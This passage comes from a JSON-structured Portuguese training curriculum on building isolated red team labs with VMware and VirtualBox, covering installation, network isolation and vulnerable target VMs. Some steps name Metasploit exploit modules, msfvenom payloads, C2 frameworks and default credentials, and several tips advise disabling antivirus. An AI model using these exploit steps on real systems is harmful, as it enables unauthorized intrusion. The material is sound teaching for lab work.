                                  "materials": "Conexão à internet estável, navegador web",
                                  "tips": "Use VPN se necessário para downloads em regiões restritas, mas priorize site oficial.",
                                  "learningObjective": "Adquirir software legítimo evitando riscos de malware em fontes não oficiais.",
                                  "commonMistakes": "Baixar de sites de terceiros ou torrents, resultando em malware."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar a Instalação do VMware Workstation",
                                  "subSteps": [
                                    "Desative temporariamente antivírus e Windows Defender para evitar falsos positivos.",
                                    "Execute o instalador como Administrador (clique direito > Run as administrator).",
                                    "Siga o wizard: aceite licença, escolha pasta de instalação, selecione componentes (inclua VMware Tools).",
                                    "Configure rede como 'Bridged' ou 'NAT' para labs iniciais.",
                                    "Reinicie o sistema quando solicitado."
                                  ],
                                  "verification": "Ícone do VMware Workstation aparece no desktop/menu de aplicativos sem erros de instalação.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Arquivo baixado, privilégios de administrador",
                                  "tips": "Em Linux, use 'sudo sh VMware-*.bundle' no terminal.",
                                  "learningObjective": "Instalar corretamente virtualizadores em hosts Windows/Linux para simulações de Red Team.",
                                  "commonMistakes": "Executar sem privilégios admin ou ignorar reinício, causando falhas em VMs."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar e Configurar Pós-Instalação",
                                  "subSteps": [
                                    "Abra o VMware Workstation e insira a chave de trial se solicitada.",
                                    "Crie uma VM de teste simples (ex: Ubuntu minimal, 2GB RAM).",
                                    "Inicie a VM e confirme que roda sem erros de virtualização.",
                                    "Teste snapshot e rede conectando à internet.",
                                    "Atualize o VMware via Help > Software Updates."
                                  ],
                                  "verification": "VM de teste inicia, roda guest OS e acessa rede sem crashes.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "ISO de OS de teste (ex: Ubuntu), VMware instalado",
                                  "learningObjective": "Validar funcionalidade completa para labs de cibersegurança.",
                                  "commonMistakes": "Conflitos com Hyper-V (desative via 'bcdedit /set hypervisorlaunchtype off').",
                                  "tips": [
                                    "Habilite virtualização (VT-x/AMD-V) no BIOS/UEFI se VMs falharem ao iniciar.",
                                    "Prefira rede NAT para testes iniciais, evitando conflitos de IP.",
                                    "Crie um snapshot logo após instalar o guest OS para facilitar rollbacks.",
                                    "Monitore uso de CPU/RAM no host via Task Manager durante testes.",
                                    "Ative 3D acceleration apenas se necessário para o lab, para economizar recursos."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team, baixe e instale VMware Workstation em um host Windows 11, habilite VT-x, crie VMs isoladas para simulador de ataque (Kali Linux atacante) e vítima (Windows Server vulnerável), configure rede interna para simular C2 sem expor à rede real.",
                              "finalVerifications": [
                                "VT-x/AMD-V confirmado ativo na BIOS e detectado pelo VMware.",
                                "Instalação completa sem erros no log (Help > About > Support).",
                                "VM de teste inicia e executa guest OS por 10 minutos sem crashes.",
                                "Rede VM conecta à internet e snapshot funciona.",
                                "Versão trial ativada e updates aplicados.",
                                "Nenhum conflito com outros hypervisors (ex: Hyper-V desativado)."
                              ],
                              "assessmentCriteria": [
                                "Todos os requisitos de hardware atendidos e documentados.",
                                "Download de fonte oficial com hash verificado.",
                                "Instalação bem-sucedida em <50 minutos totais.",
                                "VM teste funcional com rede e snapshots.",
                                "Relatório de verificações finais completo.",
                                "Ambiente pronto para lab Red Team sem vazamentos de rede."
                              ],
                              "crossCurricularConnections": [
                                "Informática Básica: Gerenciamento de hardware e BIOS.",
                                "Redes: Configuração de bridged/NAT para simulações seguras.",
                                "Segurança da Informação: Verificação de integridade de downloads.",
                                "Sistemas Operacionais: Instalação em Windows/Linux hosts."
                              ],
                              "realWorldApplication": "Profissionais de Red Team usam VMware Workstation para montar labs isolados de pentest, simulando ataques em VMs sem riscos ao host ou rede corporativa, essencial em certificações como OSCP e operações de threat hunting."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.1.1.2.2",
                            "name": "Configurar Redes Isoladas no VMware",
                            "description": "Criar redes personalizadas (Custom VMnet) com modo Host-Only ou isolado, configurando DHCP interno e firewall para simular ambientes de ataque sem exposição à rede real.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente VMware para Configuração de Redes",
                                  "subSteps": [
                                    "Abra o VMware Workstation/Player/Fusion e verifique se está atualizado.",
                                    "Acesse 'Edit' > 'Virtual Network Editor' (requer privilégios de administrador).",
                                    "Liste as redes VMnet existentes e identifique VMnet1 (Host-Only) como base.",
                                    "Desative temporariamente redes existentes se necessário para evitar conflitos.",
                                    "Confirme que o VMware DHCP service está rodando via services.msc (Windows)."
                                  ],
                                  "verification": "Virtual Network Editor abre sem erros e lista redes existentes.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "VMware Workstation/Player/Fusion instalado",
                                    "Conta de administrador"
                                  ],
                                  "tips": "Execute como administrador para evitar bloqueios de permissão.",
                                  "learningObjective": "Entender a interface de gerenciamento de redes virtuais no VMware.",
                                  "commonMistakes": [
                                    "Não executar como admin",
                                    "Ignorar versão desatualizada do VMware"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar uma Nova VMnet Personalizada Isolada",
                                  "subSteps": [
                                    "No Virtual Network Editor, clique 'Add Network' e selecione 'Custom'.",
                                    "Nomeie como 'IsolatedNet-RedTeam' e defina tipo como 'Host-only' com isolamento.",
                                    "Desmarque 'Connect a host virtual adapter' e 'Use local DHCP service' inicialmente.",
                                    "Defina subnet como 192.168.100.0/24 (evite conflitos com rede real).",
                                    "Salve as configurações e aplique mudanças."
                                  ],
                                  "verification": "Nova VMnet aparece na lista com configurações salvas sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Virtual Network Editor acessível"
                                  ],
                                  "tips": "Use sub-redes privadas não sobrepostas à sua rede local (verifique ipconfig/ifconfig).",
                                  "learningObjective": "Criar redes virtuais personalizadas com isolamento total.",
                                  "commonMistakes": [
                                    "Subnet conflitante com rede host",
                                    "Não desmarcar conectividade host"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar DHCP Interno para a Rede Isolada",
                                  "subSteps": [
                                    "Selecione a nova VMnet e marque 'Use local DHCP service to distribute IP address'.",
                                    "Configure DHCP: range 192.168.100.10 a 192.168.100.50, gateway 192.168.100.1.",
                                    "Defina DNS como 192.168.100.1 ou desabilite se não necessário para isolamento.",
                                    "Inicie o serviço DHCP clicando 'Apply' e reinicie o VMware Network Services.",
                                    "Verifique logs do DHCP em VMware para confirmação de inicialização."
                                  ],
                                  "verification": "DHCP está ativo e range configurado corretamente no editor.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Virtual Network Editor"
                                  ],
                                  "tips": "Mantenha range pequeno para simulações controladas.",
                                  "learningObjective": "Implementar alocação automática de IPs em rede virtual isolada.",
                                  "commonMistakes": [
                                    "Range inválido ou sobreposto",
                                    "Não reiniciar serviços"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Firewall e Testar Isolamento nas VMs",
                                  "subSteps": [
                                    "Crie duas VMs (ex: Attacker e Victim) e atribua a nova VMnet a seus adaptadores.",
                                    "Inicie as VMs e configure firewall: bloqueie todo tráfego inbound/outbound exceto rede interna.",
                                    "No host, desative firewall temporariamente e teste ping entre VMs (deve funcionar).",
                                    "Teste conectividade externa: ping google.com das VMs (deve falhar).",
                                    "Monitore tráfego com Wireshark na VMnet para confirmar isolamento."
                                  ],
                                  "verification": "VMs se comunicam internamente via ping, mas sem acesso à internet ou host.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "2 VMs criadas",
                                    "Wireshark opcional"
                                  ],
                                  "tips": "Use regras específicas no Windows Firewall ou ufw/iptables no Linux.",
                                  "learningObjective": "Garantir isolamento total simulando ambiente de ataque seguro.",
                                  "commonMistakes": [
                                    "Firewall não configurado corretamente",
                                    "Testes incompletos de vazamento"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e Documentar a Configuração Final",
                                  "subSteps": [
                                    "Capture screenshots do Virtual Network Editor e configurações de VMs.",
                                    "Execute comandos: ipconfig/ifconfig nas VMs para verificar IPs alocados.",
                                    "Teste cenários de ataque simulados (ex: nmap interno deve funcionar, externo não).",
                                    "Documente subnet, DHCP range e regras de firewall em um arquivo README.",
                                    "Backup da configuração VMware exportando VMs."
                                  ],
                                  "verification": "Todos testes passam e documentação completa.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Ferramentas de captura de tela"
                                  ],
                                  "tips": "Automatize testes com scripts batch/shell para repetibilidade.",
                                  "learningObjective": "Documentar e validar ambientes isolados para reprodutibilidade.",
                                  "commonMistakes": [
                                    "Omitir documentação",
                                    "IPs não alocados corretamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure uma IsolatedNet-RedTeam com VMs 'Kali-Attacker' (192.168.100.10) e 'Windows-Victim' (192.168.100.20). Atribua a rede, inicie DHCP, bloqueie firewall para externa. Teste: nmap -sn 192.168.100.0/24 detecta apenas VMs internas; simule ataque Metasploit sem exposição à rede corporativa.",
                              "finalVerifications": [
                                "VMnet customizada listada no Virtual Network Editor com isolamento ativo.",
                                "DHCP aloca IPs corretamente nas VMs (ex: 192.168.100.x).",
                                "Ping interno entre VMs succeeds; ping externo (8.8.8.8) falha.",
                                "Firewall bloqueia todo tráfego não-interno sem exceções.",
                                "Nenhum tráfego vaza para host ou internet via Wireshark.",
                                "Configuração persiste após reboot do host."
                              ],
                              "assessmentCriteria": [
                                "Rede criada sem erros de subnet ou conflito (100% configurada).",
                                "DHCP funcional com alocação automática em <1min por VM.",
                                "Isolamento total: 0% conectividade externa comprovada por testes.",
                                "Documentação completa com screenshots e comandos executados.",
                                "Tempo total dentro de 90 minutos com zero retrabalho.",
                                "Capacidade de simular ataque básico (ex: port scan interno)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Conceitos de subnetting e DHCP.",
                                "Segurança da Informação: Firewalls e segmentação de rede.",
                                "Virtualização: Gerenciamento de hypervisors como VMware vSphere.",
                                "Programação/DevOps: Automatização via vSphere API ou scripts PowerCLI.",
                                "Análise Forense: Monitoramento de tráfego com Wireshark/Tcpdump."
                              ],
                              "realWorldApplication": "Em operações Red Team, configura labs isolados para jogos de guerra cibernéticos, permitindo testes de exploits (ex: EternalBlue) em VMs vítima sem risco à infraestrutura corporativa ou exposição legal."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.1.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.7.1.1.2.3",
                            "name": "Criar e Gerenciar VMs para Red Team",
                            "description": "Importar ou criar VMs de alvos vulneráveis (ex: Metasploitable), ativar snapshots para rollback de exploits e configurar bridged/NAT para testes de C2 (Comando e Controle).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar e Configurar o Ambiente VMware",
                                  "subSteps": [
                                    "Instalar VMware Workstation/Player ou Fusion no host OS (Windows/Linux/macOS).",
                                    "Verificar requisitos de hardware: CPU com virtualização habilitada (VT-x/AMD-V), RAM mínima 8GB.",
                                    "Criar uma nova pasta para o laboratório Red Team e configurar preferências de rede (NAT/Bridged).",
                                    "Habilitar aceleração 3D e USB compatibility se necessário para VMs.",
                                    "Testar criação de uma VM básica para validar instalação."
                                  ],
                                  "verification": "VM básica inicia sem erros e roda um SO teste como Ubuntu minimal.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": "VMware Workstation/Player ISO/download oficial, Host com specs adequadas, Internet para download.",
                                  "tips": "Use licença trial ou versão free Player para iniciantes; desative firewall/antivírus temporariamente se bloquear.",
                                  "learningObjective": "Configurar VMware corretamente para suportar múltiplas VMs isoladas em ambiente Red Team.",
                                  "commonMistakes": "Esquecer de habilitar virtualização na BIOS; instalar versão errada para o host OS."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Importar ou Criar VM Alvo Vulnerável",
                                  "subSteps": [
                                    "Baixar OVA/OVF de Metasploitable 2/3 ou VulnHub VMs (ex: Kioptrix).",
                                    "No VMware, selecionar File > Open e importar o arquivo OVA/OVF na pasta do lab.",
                                    "Alternativamente, criar VM manual: New VM > Typical > Selecionar ISO vulnerável > Configurar 1-2GB RAM, 1 vCPU, 20GB disco.",
                                    "Instalar SO na VM criada e aplicar patches mínimos para estabilidade.",
                                    "Nomear VM como 'Target-RedTeam-01' e adicionar tags para organização."
                                  ],
                                  "verification": "VM inicia, login padrão funciona (ex: msfadmin:msfadmin no Metasploitable), serviços vulneráveis expostos (netstat -tuln).",
                                  "estimatedTime": "20-40 minutos",
                                  "materials": "Arquivos OVA de Metasploitable/VulnHub, ISOs de SO vulneráveis.",
                                  "tips": "Use OVA para importação rápida; verifique hash MD5 do download para integridade.",
                                  "learningObjective": "Selecionar e preparar VMs representando alvos reais vulneráveis para simulações de ataque.",
                                  "commonMistakes": "Importar VM incompatível com versão VMware; alocar RAM insuficiente causando crashes."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Rede Bridged/NAT para Testes C2",
                                  "subSteps": [
                                    "Editar configurações de VM: VM > Settings > Network Adapter > Bridged (para rede real) ou NAT (isolada).",
                                    "No host, configurar VMnet adaptadores via Edit > Virtual Network Editor (admin rights).",
                                    "Na VM alvo, configurar IP estático (ex: bridged 192.168.1.100/24, NAT DHCP auto).",
                                    "Testar conectividade: ping do host para VM e vice-versa; acessar serviços via browser/curl.",
                                    "Habilitar promiscuous mode na rede virtual para captura de tráfego se necessário."
                                  ],
                                  "verification": "VM acessível via IP do host (ping/nmap), sem conflitos de IP; tráfego C2 simulado flui (ex: nc listener).",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": "Virtual Network Editor (VMware), Ferramentas como ping, nmap no host.",
                                  "tips": "Prefira NAT para labs isolados evitando exposição real; bridged para simular rede corporativa.",
                                  "learningObjective": "Adaptar configurações de rede para cenários de testes C2 sem comprometer o host.",
                                  "commonMistakes": "Conflitos de IP com rede host; esquecer de autorizar promiscuous mode bloqueando scans."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Snapshots e Gerenciar VMs para Rollback",
                                  "subSteps": [
                                    "VM ligada: VM > Snapshot > Take Snapshot > Nome 'Baseline-Clean' (incluir RAM se estado crítico).",
                                    "Criar múltiplos snapshots: após setup inicial, após cada exploit fase (ex: 'Post-SMB-Exploit').",
                                    "Configurar auto-snapshot ou scripts para rollback rápido via VMware API/CLI.",
                                    "Testar rollback: Revert to Snapshot > Verificar estado restaurado (serviços resetados).",
                                    "Organizar VMs em pastas/groups e clonar para múltiplos alvos."
                                  ],
                                  "verification": "Snapshot revertido restaura VM ao estado baseline; exploits não persistem após rollback.",
                                  "estimatedTime": "15-30 minutos",
                                  "materials": "VM em execução, Espaço disco extra (snapshots consomem ~10-20% disco VM).",
                                  "tips": "Limite snapshots a 5-10 por VM para performance; exclua RAM em snapshots não-voláteis.",
                                  "learningObjective": "Implementar gerenciamento de estado para eficiência em iterações de testes Red Team.",
                                  "commonMistakes": "Snapshots com disco cheio causando corruption; não nomear snapshots adequadamente."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Validar Configuração Completa para Red Team",
                                  "subSteps": [
                                    "Simular C2: Na VM atacante (Kali separada), executar exploit (ex: msfconsole > exploit/multi/samba/usermap_script).",
                                    "Explorar VM alvo, criar payload C2 (msfvenom), infectar e controlar shell.",
                                    "Snapshot após exploit, testar rollback, reconectar C2 em estado limpo.",
                                    "Monitorar recursos: CPU/RAM/disco no VMware para otimização.",
                                    "Documentar setup em README: IPs, snapshots, credenciais."
                                  ],
                                  "verification": "Exploit bem-sucedido, C2 estabelecido, rollback limpa infecção sem perda de baseline.",
                                  "estimatedTime": "30-60 minutos",
                                  "materials": "VM Kali atacante, Metasploit Framework, Scripts C2 básicos.",
                                  "tips": "Use Empire/Covenant para C2 realista; grave sessão com VMware screen recording.",
                                  "learningObjective": "Integrar VMs em fluxo Red Team completo com gerenciamento robusto.",
                                  "commonMistakes": "Expor C2 para internet acidentalmente; ignorar overhead de snapshots degradando perf."
                                }
                              ],
                              "practicalExample": "Em um lab Red Team, importe Metasploitable 2 via OVA no VMware. Configure NAT (VM IP: 192.168.200.10). Crie snapshot 'Clean'. De Kali host (192.168.200.15), use Metasploit para exploit Samba (use auxiliary/scanner/smb/smb_version -> exploit/multi/samba/usermap_script), ganhe shell. Snapshot 'Compromised'. Revert to 'Clean', reteste exploit confirmando rollback perfeito para iterações rápidas.",
                              "finalVerifications": [
                                "VMs importadas/criadas iniciam sem erros e expõem vulnerabilidades conhecidas.",
                                "Rede bridged/NAT permite comunicação bidirecional host-VM sem vazamentos.",
                                "Snapshots revertem estado precisamente, resetando exploits e payloads.",
                                "Múltiplas VMs gerenciáveis simultaneamente sem conflitos de recursos.",
                                "Documentação do lab acessível e atualizada com IPs/snapshots.",
                                "Teste C2 simulado estabelece controle reversível via rollback."
                              ],
                              "assessmentCriteria": [
                                "Precisão na importação/criação de VMs vulneráveis (sem erros de compatibilidade).",
                                "Eficiência de configuração de rede (conectividade em <5min, isolada adequadamente).",
                                "Robustez de snapshots (rollback em <1min, integridade 100%).",
                                "Capacidade de gerenciar 3+ VMs em cenários multi-alvo.",
                                "Integração prática com ferramentas Red Team (Metasploit/C2 frameworks).",
                                "Otimização de recursos (uso <70% host durante testes)."
                              ],
                              "crossCurricularConnections": [
                                "Redes Computacionais: Configuração bridged/NAT e promiscuous mode.",
                                "Sistemas Operacionais: Instalação/patching de SOs vulneráveis em VMs.",
                                "Pentest e Ethical Hacking: Uso de Metasploitable em fluxos de exploit.",
                                "Gerenciamento de Infraestrutura: Automação via VMware CLI/API.",
                                "Segurança Aplicada: Isolamento de labs para evitar escapes."
                              ],
                              "realWorldApplication": "Em operações Red Team profissionais, Red Teamers criam labs VMware com VMs como Metasploitable para validar táticas MITRE ATT&CK (TA0001 Initial Access), testando C2 como Cobalt Strike em snapshots para iterações rápidas sem reconstruir ambientes, simulando brechas corporativas e reportando findings para Blue Teams melhorarem defesas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.1.1.1.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.1.1.3",
                        "name": "VirtualBox como Plataforma de Virtualização",
                        "description": "Uso do Oracle VirtualBox como solução open-source e gratuita para montagem de labs portáteis, enfatizando instalação em múltiplos SOs e suporte a extensões para aceleração de hardware.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.1.1.3.1",
                            "name": "Instalar Oracle VirtualBox",
                            "description": "Baixar VirtualBox e Extension Pack do site oficial, instalar em hosts Windows, Linux ou macOS, habilitando aceleração 3D e USB para simulações realistas de ambientes cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Verificar Requisitos do Sistema e Baixar Arquivos",
                                  "subSteps": [
                                    "Acesse o site oficial da Oracle VirtualBox (virtualbox.org) e verifique a versão mais recente compatível com seu host OS (Windows, Linux ou macOS).",
                                    "Confira os requisitos mínimos: CPU com suporte a virtualização (VT-x/AMD-V), pelo menos 4GB RAM, 500MB espaço em disco para instalação.",
                                    "Baixe o instalador principal do VirtualBox para seu SO.",
                                    "Baixe o Oracle VM VirtualBox Extension Pack da mesma página (mesma versão).",
                                    "Verifique a integridade dos downloads usando hashes SHA256 fornecidos no site."
                                  ],
                                  "verification": "Arquivos baixados estão intactos (hash verificado) e requisitos do sistema atendidos via ferramentas como CPU-Z ou msinfo32 (Windows).",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Navegador web",
                                    "Espaço em disco livre (500MB+)",
                                    "Conexão à internet"
                                  ],
                                  "tips": "Sempre baixe do site oficial para evitar malware; anote a versão baixada para compatibilidade.",
                                  "learningObjective": "Identificar e preparar o ambiente host para instalação segura do VirtualBox.",
                                  "commonMistakes": [
                                    "Baixar de fontes não oficiais",
                                    "Ignorar requisitos de hardware levando a falhas de virtualização",
                                    "Não verificar hashes de integridade"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar o Oracle VirtualBox no Host",
                                  "subSteps": [
                                    "Execute o instalador como administrador (Windows: clique direito > Executar como admin; Linux: sudo; macOS: arraste para Applications).",
                                    "Siga o assistente de instalação, aceitando padrões, mas habilite 'Network Interfaces' e 'USB Support' se solicitado.",
                                    "No Windows, permita drivers de rede e USB durante a instalação; reinicie se solicitado.",
                                    "No Linux, instale dependências como dkms e kernel-headers se necessário (ex: sudo apt install dkms linux-headers-$(uname -r)).",
                                    "No macOS, conceda permissões de segurança em System Preferences > Security & Privacy."
                                  ],
                                  "verification": "VirtualBox Manager inicia sem erros e exibe a tela principal vazia.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Instalador baixado",
                                    "Privilégios de administrador/root"
                                  ],
                                  "tips": "Desative antivírus temporariamente se bloquear drivers; use modo compatibilidade no Windows se necessário.",
                                  "learningObjective": "Executar instalação cross-platform do VirtualBox com suporte essencial ativado.",
                                  "commonMistakes": [
                                    "Não executar como admin causando falha em drivers",
                                    "Pular reinicialização no Windows",
                                    "Conflitos com antivírus em drivers de rede"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalar o Oracle VM VirtualBox Extension Pack",
                                  "subSteps": [
                                    "Abra o VirtualBox Manager.",
                                    "Vá em File > Preferences/Tools > Extensions > clique no ícone de adição (+).",
                                    "Selecione o arquivo Extension Pack baixado e instale (confirme licença Oracle).",
                                    "Reinicie o VirtualBox se solicitado.",
                                    "Verifique na aba Extensions se o pack está listado e habilitado."
                                  ],
                                  "verification": "Extension Pack aparece na lista de extensões com status 'Enabled'.",
                                  "estimatedTime": "5-10 minutos",
                                  "materials": [
                                    "Extension Pack baixado",
                                    "VirtualBox Manager aberto"
                                  ],
                                  "tips": "Garante versões iguais entre VirtualBox e Extension Pack para evitar erros de compatibilidade.",
                                  "learningObjective": "Adicionar funcionalidades avançadas como suporte USB 2.0/3.0 e RDP.",
                                  "commonMistakes": [
                                    "Versões mismatch causando falha na instalação",
                                    "Não reiniciar o VirtualBox após instalação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Aceleração 3D e Suporte USB",
                                  "subSteps": [
                                    "Crie uma VM de teste (New > configure com SO guest básico).",
                                    "Na configuração da VM: System > Acceleration > habilite 'Enable VT-x/AMD-V' e 'Enable Nested Paging'.",
                                    "Display > Screen > habilite 'Enable 3D Acceleration' (instale Guest Additions depois para pleno suporte).",
                                    "USB > habilite 'Enable USB Controller' e selecione USB 2.0/3.0.",
                                    "Salve configurações e inicie a VM para testar."
                                  ],
                                  "verification": "VM inicia com gráficos acelerados (sem mensagem de '3D não suportado') e detecta dispositivos USB conectados.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "VM de teste ISO (ex: Ubuntu minimal)",
                                    "Dispositivo USB para teste"
                                  ],
                                  "tips": "Ative virtualização na BIOS/UEFI se não detectada; use Guest Additions para aceleração completa.",
                                  "learningObjective": "Otimizar VM para simulações realistas em cibersegurança com performance gráfica e periféricos.",
                                  "commonMistakes": [
                                    "Virtualização desabilitada na BIOS",
                                    "Selecionar USB errada sem suporte Extension Pack",
                                    "Conflitos com drivers host"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar e Testar a Instalação Completa",
                                  "subSteps": [
                                    "Inicie a VM de teste e instale Guest Additions (Devices > Insert Guest Additions CD).",
                                    "Teste aceleração 3D rodando um app gráfico na guest (ex: glxgears no Linux).",
                                    "Conecte um USB real e verifique passthrough na guest.",
                                    "Crie uma rede Host-Only ou NAT e teste conectividade entre host e guest.",
                                    "Registre logs de erros em Window > Show Log para troubleshooting."
                                  ],
                                  "verification": "VM roda suavemente com 3D, USB funciona, rede conecta sem issues; logs limpos.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "ISO guest OS",
                                    "Dispositivo USB",
                                    "Ferramentas de rede como ping"
                                  ],
                                  "tips": "Documente configurações para replicação em labs cibernéticos; backup de VMs.",
                                  "learningObjective": "Validar instalação para uso em ambientes de simulação cibernética.",
                                  "commonMistakes": [
                                    "Pular Guest Additions limitando 3D/USB",
                                    "Ignorar logs de erros iniciais"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de Red Team, instale VirtualBox em um host Windows 11 para criar uma VM Kali Linux com aceleração 3D para ferramentas gráficas como Wireshark e suporte USB para testar keyloggers em cenários de ataque simulados.",
                              "finalVerifications": [
                                "VirtualBox Manager abre e lista extensões corretamente.",
                                "VM de teste inicia com aceleração 3D ativa (sem warnings).",
                                "USB 3.0 passthrough funciona com dispositivo real.",
                                "Rede virtual conecta host-guest com ping bem-sucedido.",
                                "Logs do VirtualBox não mostram erros críticos.",
                                "Performance da VM é responsiva em tarefas gráficas."
                              ],
                              "assessmentCriteria": [
                                "Instalação completa sem erros em todos os SO hosts suportados.",
                                "Configurações de 3D e USB verificadas e funcionais.",
                                "Downloads verificados por hash e de fonte oficial.",
                                "Tempo total dentro de 60-90 minutos com documentação.",
                                "Capacidade de troubleshooting comum demonstrada.",
                                "VM pronta para simulações cibernéticas realistas."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Configuração de adapters NAT/Bridged para simulações de rede.",
                                "Sistemas Operacionais: Gerenciamento de guests multi-OS e drivers virtuais.",
                                "Hardware e Arquitetura: Entendimento de VT-x/AMD-V e alocação de recursos.",
                                "Segurança da Informação: Isolamento de ambientes para testes de penetração.",
                                "Desenvolvimento de Software: Uso em CI/CD com VMs headless."
                              ],
                              "realWorldApplication": "Em operações de cibersegurança e jogos de guerra cibernéticos, o VirtualBox permite aos times Red criar labs isolados para simular ataques reais (ex: ransomware em VM Windows), testar defesas Blue Team e treinar sem riscos a infra real, essencial em CTFs e certificações como OSCP."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.1.1.3.2",
                            "name": "Configurar Isolamento de Rede",
                            "description": "Implementar modos de rede Internal/Host-Only para isolamento total, criando múltiplas interfaces virtuais e testando conectividade sem acesso externo, ideal para regras de engajamento em Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar Adaptadores de Rede Host-Only no VirtualBox",
                                  "subSteps": [
                                    "Abra o VirtualBox e acesse 'Arquivo > Gerenciador de Rede Host-Only'.",
                                    "Clique em 'Criar' para adicionar um novo adaptador Host-Only se não existir.",
                                    "Configure o adaptador com endereço IP estático (ex: 192.168.56.1/24) e ative DHCP se necessário.",
                                    "Salve as configurações e verifique se o adaptador aparece na lista de redes disponíveis.",
                                    "Teste a conectividade básica do adaptador no host via prompt de comando (ipconfig/ifconfig)."
                                  ],
                                  "verification": "O adaptador Host-Only está listado e ativo no Gerenciador de Rede do VirtualBox, com IP configurado visível no host.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "VirtualBox instalado",
                                    "VMs preparadas (mínimo 2)",
                                    "Acesso administrador no host"
                                  ],
                                  "tips": "Use sub-redes privadas como 192.168.56.0/24 para evitar conflitos com redes reais.",
                                  "learningObjective": "Entender e configurar adaptadores Host-Only para comunicação isolada entre host e VMs.",
                                  "commonMistakes": [
                                    "Não ativar o adaptador após criação",
                                    "Conflito de IP com rede existente do host",
                                    "Esquecer de salvar configurações"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Rede Internal Network nas VMs",
                                  "subSteps": [
                                    "Selecione uma VM, vá em Configurações > Rede > Adaptador 1 e defina 'Rede Interna'.",
                                    "Nomeie a rede como 'redteam-internal' (mesmo nome para todas VMs no grupo isolado).",
                                    "Habilite o adaptador e defina como Principal.",
                                    "Repita para a segunda VM ou mais, garantindo o mesmo nome de rede interna.",
                                    "Inicie as VMs e configure IPs estáticos manualmente dentro da VM (ex: 10.0.0.10/24)."
                                  ],
                                  "verification": "Dentro das VMs, ping entre elas funciona (ex: ping 10.0.0.11), mas ping para host ou gateway falha.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "VMs com SO instalado (ex: Ubuntu/Kali)",
                                    "Conhecimento básico de configuração de IP em Linux/Windows"
                                  ],
                                  "tips": "O nome da rede interna deve ser idêntico em byte para VMs se comunicarem; use nomes descritivos.",
                                  "learningObjective": "Implementar rede interna para isolamento total entre VMs sem acesso ao host ou internet.",
                                  "commonMistakes": [
                                    "Nomes de rede diferentes entre VMs",
                                    "Não habilitar o adaptador",
                                    "IPs fora da mesma sub-rede"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar Múltiplas Interfaces Virtuais e Configurar Host-Only",
                                  "subSteps": [
                                    "Na VM alvo, vá em Configurações > Rede > Adaptador 2 e defina 'Rede Host-Only', selecionando o adaptador criado.",
                                    "Adicione Adaptador 3 como 'Rede Interna' com nome 'redteam-internal' para múltiplas interfaces.",
                                    "Dentro da VM, configure as interfaces via /etc/network/interfaces ou nmcli (ex: enp0s8 para Host-Only).",
                                    "Repita para outras VMs, criando pelo menos 2 interfaces por VM (uma Internal, uma Host-Only).",
                                    "Reinicie as interfaces de rede nas VMs com ifdown/ifup ou systemctl restart networking."
                                  ],
                                  "verification": "Comando 'ip a' nas VMs mostra múltiplas interfaces ativas; ping host via Host-Only ok, mas não via Internal.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação de networking do SO da VM",
                                    "Editor de texto com sudo"
                                  ],
